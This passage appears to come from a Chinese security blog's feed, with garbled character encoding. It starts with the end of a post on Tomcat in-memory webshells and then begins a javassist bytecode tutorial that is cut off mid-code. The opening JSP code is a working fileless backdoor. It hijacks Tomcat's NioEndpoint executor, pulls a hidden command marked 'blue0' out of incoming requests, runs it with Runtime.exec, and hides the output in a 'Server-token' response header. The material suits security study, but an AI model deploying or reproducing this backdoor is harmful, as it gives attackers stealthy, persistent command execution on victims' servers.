clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            &#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getStandardService</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> jioEndPoint;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//æ¶æ„executor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">threadexcutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">threadexcutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize, <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;<br>            <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br><br><br>                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;nioChannels&quot;</span>), <span class="hljs-string">&quot;stack&quot;</span>);<br><br><br>                                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">heapByteBuffer</span> <span class="hljs-operator">=</span> (ByteBuffer) getField(getField(objects[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;appReadBufHandler&quot;</span>), <span class="hljs-string">&quot;byteBuffer&quot;</span>);<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(heapByteBuffer.array(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br><br>                                    <span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>));<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br>                                        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.substring(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) + <span class="hljs-string">&quot;blue0&quot;</span>.length() + <span class="hljs-number">1</span>, a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br><br>                                        b = decode(DEFAULT_SECRET_KEY, b);<br><br>                                        <span class="hljs-keyword">return</span> b;<br>                                    &#125;<br><br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    System.out.println(var11);<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getResponse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] res)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>), <span class="hljs-string">&quot;processors&quot;</span>);<br>                                    <span class="hljs-keyword">for</span> (Object tmp_object : objects) &#123;<br>                                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (RequestInfo) tmp_object;<br>                                        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) getField(getField(request, <span class="hljs-string">&quot;req&quot;</span>), <span class="hljs-string">&quot;response&quot;</span>);<br>                                        response.addHeader(<span class="hljs-string">&quot;Server-token&quot;</span>, encode(DEFAULT_SECRET_KEY,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;UTF-8&quot;</span>)));<br><br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> &#123;<br><span class="hljs-comment">//            System.out.println(&quot;123&quot;);</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> getRequest();<br>            <span class="hljs-keyword">if</span> (cmd.length() &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> rt.exec(cmd);<br>                    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>                    java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>                    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-keyword">while</span> ((tmp = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        s += tmp;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (s != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                        <span class="hljs-type">byte</span>[] res = s.getBytes(StandardCharsets.UTF_8);<br>                        getResponse(res);<br>                    &#125;<br><br><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">this</span>.execute(command, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS);<br>        &#125;<br><br>    &#125;<br><br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">NioEndpoint</span> <span class="hljs-variable">nioEndpoint</span> <span class="hljs-operator">=</span> (NioEndpoint) getStandardService();<br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="hljs-string">&quot;executor&quot;</span>);<br>    <span class="hljs-type">threadexcutor</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());<br>    nioEndpoint.setExecutor(exe);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…¶å®å‰é¢çš„ä¼ ç»Ÿwebåº”ç”¨å†…å­˜é©¬ä¹Ÿæ˜¯tomcatè¿™éƒ¨åˆ†çš„ï¼Œå› ä¸ºå®ƒåŸºäºtomcatè¿›è¡Œåˆ†æä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåˆ«çš„ä¸­é—´ä»¶åº”è¯¥ä¹Ÿæ˜¯æœ‰è¿™äº›åŸºæœ¬ç»„ä»¶çš„ã€‚&lt;/p&gt;
&lt;h1 id=&quot;tomcat-valveå†…å­˜é©¬&quot;&gt;&lt;a href=&quot;#Tomcat-Valveå†…å­˜é©¬&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>javassistå­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºçœ‹åˆ°åœ¨ç¼©çŸ­payloadçš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ï¼š<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1 id="javassistä»‹ç»"><a href="#javassistä»‹ç»" class="headerlink" title="javassistä»‹ç»"></a>javassistä»‹ç»</h1><p>Javassist æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“.ï¼›å…¶ä¸»è¦ä¼˜ç‚¹åœ¨äºç®€å•å¿«é€Ÿ. ç›´æ¥ä½¿ç”¨ java ç¼–ç çš„å½¢å¼, è€Œä¸éœ€è¦äº†è§£è™šæ‹ŸæœºæŒ‡ä»¤, å°±èƒ½åŠ¨æ€æ”¹å˜ç±»çš„ç»“æ„, æˆ–è€…åŠ¨æ€ç”Ÿæˆç±»ã€‚</p><p>ä½¿ç”¨å‰å¯¼å…¥jaråŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassistä¸­æœ€ä¸ºé‡è¦çš„æ˜¯<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>ä»¥åŠ<code>CtField</code>è¿™å‡ ä¸ªç±».</p><ul><li><code>ClassPool</code>: ä¸€ä¸ªåŸºäº<code>Hashtable</code>å®ç°çš„<code>CtClass</code>å¯¹è±¡å®¹å™¨, å…¶ä¸­é”®æ˜¯ç±»åç§°, å€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡</li><li><code>CtClass</code>: <code>CtClass</code>è¡¨ç¤ºç±», ä¸€ä¸ª<code>CtClass</code>(ç¼–è¯‘æ—¶ç±»)å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ªclassæ–‡ä»¶, è¿™äº›<code>CtClass</code>å¯¹è±¡å¯ä»¥ä»<code>ClassPool</code>è·å¾—</li><li><code>CtMethod</code>: è¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•</li><li><code>CtField</code>: è¡¨ç¤ºç±»ä¸­çš„å­—æ®µ</li><li><code>CtConstructor</code>:å¯è¯»å†™çš„ç±»æ„é€ æ–¹æ³•å¯¹è±¡</li></ul><h1 id="classpoolç›¸å…³æ–¹æ³•"><a href="#ClassPoolç›¸å…³æ–¹æ³•" class="headerlink" title="ClassPoolç›¸å…³æ–¹æ³•"></a>ClassPoolç›¸å…³æ–¹æ³•</h1><ul><li><code>getDefault</code>: è¿”å›é»˜è®¤çš„<code>ClassPool</code>æ˜¯å•ä¾‹æ¨¡å¼çš„ï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„<code>ClassPool</code>ï¼›</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : å°†ä¸€ä¸ª<code>ClassPath</code>åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½® æˆ– æ’å…¥åˆ°èµ·å§‹ä½ç½®ã€‚é€šå¸¸é€šè¿‡è¯¥æ–¹æ³•å†™å…¥é¢å¤–çš„ç±»æœç´¢è·¯å¾„ï¼Œä»¥è§£å†³å¤šä¸ªç±»åŠ è½½å™¨ç¯å¢ƒä¸­æ‰¾ä¸åˆ°ç±»çš„å°´å°¬ï¼›</li><li><code>toClass</code> : å°†ä¿®æ”¹åçš„<code>CtClass</code>åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ï¼Œ<code>CtClass</code>çš„<code>toClass</code>æ–¹æ³•æ˜¯é€šè¿‡è°ƒç”¨æœ¬æ–¹æ³•å®ç°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„classï¼›</li><li><code>get</code> , <code>getCtClass</code>: æ ¹æ®ç±»è·¯å¾„åè·å–è¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡ï¼Œç”¨äºåç»­çš„ç¼–è¾‘ã€‚</li></ul><p>ClassPoolå¯¹è±¡çš„åˆ›å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–ClassPoolå¯¹è±¡, ä½¿ç”¨ç³»ç»Ÿé»˜è®¤ç±»è·¯å¾„</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// æ•ˆæœä¸ new ClassPool(true) ä¸€è‡´ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯é»˜è®¤çš„å•ä¾‹æ¨¡å¼</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>ä¸ºå‡å°‘ClassPoolå¯èƒ½å¯¼è‡´çš„å†…å­˜æ¶ˆè€—ï¼› å¯ä»¥ä»ClassPoolä¸­åˆ é™¤ä¸å¿…è¦çš„CtClasså¯¹è±¡. æˆ–è€…æ¯æ¬¡åˆ›å»ºæ–°çš„ClassPoolå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä»ClassPoolä¸­åˆ é™¤CtClasså¯¹è±¡</span><br>ctClass.detach();<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥æ¯æ¬¡åˆ›å»ºä¸€ä¸ªæ–°çš„ClassPool, è€Œä¸æ˜¯ClassPool.getDefault(), é¿å…å†…å­˜æº¢å‡º</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1 id="ctclassç›¸å…³æ–¹æ³•"><a href="#CtClassç›¸å…³æ–¹æ³•" class="headerlink" title="CtClassç›¸å…³æ–¹æ³•"></a>CtClassç›¸å…³æ–¹æ³•</h1><ul><li>freeze: å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ï¼›</li><li>isFrozen : åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ï¼›</li><li>prune : åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ï¼›</li><li>defrost : è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ï¼›</li><li>detach : å°†è¯¥classä»ClassPoolä¸­åˆ é™¤ï¼›</li><li>writeFile : æ ¹æ®CtClassç”Ÿæˆ .class æ–‡ä»¶ï¼›</li><li>toClass : é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥CtClassã€‚</li><li>setInterfaces: æ·»åŠ çˆ¶æ¥å£</li><li>setSuperclass: æ·»åŠ çˆ¶ç±»</li></ul><h2 id="è·å–ctclass"><a href="#è·å–CtClass" class="headerlink" title="è·å–CtClass"></a>è·å–CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//æœªè·å–åˆ°ç±»æˆ–æŠ›å¼‚å¸¸</span><br><span class="hljs-comment">// é€šè¿‡ç±»åè·å– CtClass, æœªæ‰¾åˆ°è¿”å› null, ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//å†»ç»“ç±»ï¼Œå³ä¸èƒ½ä¿®æ”¹</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å†»ç»“ï¼Œå³ä¸å¯ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºctclass"><a href="#åˆ›å»ºCtClass" class="headerlink" title="åˆ›å»ºCtClass"></a>åˆ›å»ºCtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å¤åˆ¶ä¸€ä¸ªç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// é€šè¿‡classæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç±»ç„¶åå†™å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åˆ›å»ºæ–°ç±»å¹¶å†™å…¥</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>ç„¶åå°±ä¼šæ ¹æ®åç§°ä¿å­˜åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œå°†ç±»æŒä¹…åŒ–äº†åˆ°æ–‡ä»¶ä¸­</p><h2 id="ctclassåŸºç¡€ä¿¡æ¯"><a href="#CtClassåŸºç¡€ä¿¡æ¯" class="headerlink" title="CtClassåŸºç¡€ä¿¡æ¯"></a>CtClassåŸºç¡€ä¿¡æ¯</h2><p>å°±æ˜¯ä¸€äº›ç±»çš„å„ç§åŸºç¡€ä¿¡æ¯ï¼Œç±»å…¨åã€ç±»æ–¹æ³•ã€ç±»å­—æ®µç­‰</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç±»å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// ç±»å…¨å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// åŒ…å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// æ¥å£</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// ç»§æ‰¿ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// è·å–ç±»æ–¹æ³•</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// è·å–ç±»å­—æ®µ</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// åˆ¤æ–­æ•°ç»„ç±»å‹</span><br>ctClass.isArray();<br><span class="hljs-comment">// åˆ¤æ–­åŸç”Ÿç±»å‹</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// åˆ¤æ–­æ¥å£ç±»å‹</span><br>ctClass.isInterface();<br><span class="hljs-comment">// åˆ¤æ–­æšä¸¾ç±»å‹</span><br>ctClass.isEnum();<br><span class="hljs-comment">// åˆ¤æ–­æ³¨è§£ç±»å‹</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹</span><br>ctClass.freeze () <br><span class="hljs-comment">// åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨</span><br>ctClass.prune() <br><span class="hljs-comment">//è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨pruneæ–¹æ³•</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2 id="å¯¹ctclassè¿›è¡Œæ“ä½œ"><a href="#å¯¹CtClassè¿›è¡Œæ“ä½œ" class="headerlink" title="å¯¹CtClassè¿›è¡Œæ“ä½œ"></a>å¯¹CtClassè¿›è¡Œæ“ä½œ</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 